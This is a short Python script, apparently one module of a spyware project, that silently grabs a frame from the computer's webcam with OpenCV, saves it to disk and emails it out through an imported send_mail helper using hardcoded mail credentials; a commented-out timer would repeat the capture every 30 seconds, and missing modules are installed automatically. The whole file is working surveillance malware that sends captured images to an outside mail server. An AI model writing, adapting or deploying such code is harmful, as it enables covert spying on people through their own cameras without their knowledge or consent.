try: #import necessary libraries
    import threading
    from threading import Timer
    import time
    import cv2
    from mail import send_mail #Send Log to Mail
except ModuleNotFoundError:
    from subprocess import call
    modules = ["opencv-contrib-python"]
    call("pip install " + ' '.join(modules), shell=True)
finally:
    EMAIL_ADDRESS = "eef5687d144f58"
    EMAIL_PASSWORD = "59d3054644d98a"
    SEND_REPORT_EVERY = 30 
    FILENAME = "C:/Users/sudee/ISAA/CamOutput.png"
    TYPE = "Webcam Data"

    class webcam:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = ""
            self.email = email
            self.password = password

        def save_web(self):
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            img_name = FILENAME
            cv2.imwrite(img_name, frame)
            cam.release()
            cv2.destroyAllWindows()

        def report(self):
            self.save_web()
            send_mail(self.email, self.password, FILENAME, TYPE)
            # timer = threading.Timer(self.interval, self.report)
            # timer.start()

        def run(self):
            self.report()

   